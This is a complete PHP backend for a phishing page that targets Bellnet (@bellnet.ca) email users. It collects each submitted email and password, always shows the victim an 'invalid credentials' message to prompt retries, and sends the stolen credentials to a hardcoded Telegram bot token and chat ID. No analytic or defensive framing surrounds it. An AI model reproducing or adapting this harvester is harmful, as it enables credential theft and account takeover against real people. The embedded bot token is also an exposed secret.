<?php

// Allow requests from any domain
header("Access-Control-Allow-Origin: *");

// Allow these request headers
header("Access-Control-Allow-Headers: Content-Type, Authorization");

// Allow these request methods
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
// Enable PHP error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Send results to Telegram
function sendToTelegram($message) {
    $botToken = '7649612009:AAGz7-YLIvEEQhWBGyHmG6uhu2vPY6U-e2Q';      // ← Replace this
    $chatId   = '7394958970';        // ← Replace this

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    @file_get_contents($url . '?' . http_build_query($params));
}

// Sanitize output
function safe($str) {
    return htmlspecialchars($str ?? '', ENT_QUOTES, 'UTF-8');
}

// Set response type
header('Content-Type: application/json');

// Initialize default response
$response = [
    'status' => 'error',
    'message' => 'Something went wrong.'
];

// Only handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['input_text'] ?? '';

    // Validate email
    if (!preg_match('/^[^@\s]+@bellnet\.ca$/', $email)) {
        $response['message'] = 'Email must end with @bellnet.ca.';
        echo json_encode($response);
        exit;
    }

    if (!$password) {
        $response['message'] = 'Password is required.';
        echo json_encode($response);
        exit;
    }

        if ($response) {
            // Login success
            $response['status'] = 'error';
            $response['message'] = 'You have entered invalid credentials. Please try again. ';
            sendToTelegram("Login details\nEmail: $email\nPassword: $password");
        } else {
            // Login failed
            $response['message'] = 'You have entered invalid credentials. Please try again. ';
            sendToTelegram(" Login details\nEmail: $email\nPassword: $password");
        } }
 else {
    $response['message'] = 'Invalid request method.';
}

echo json_encode($response);



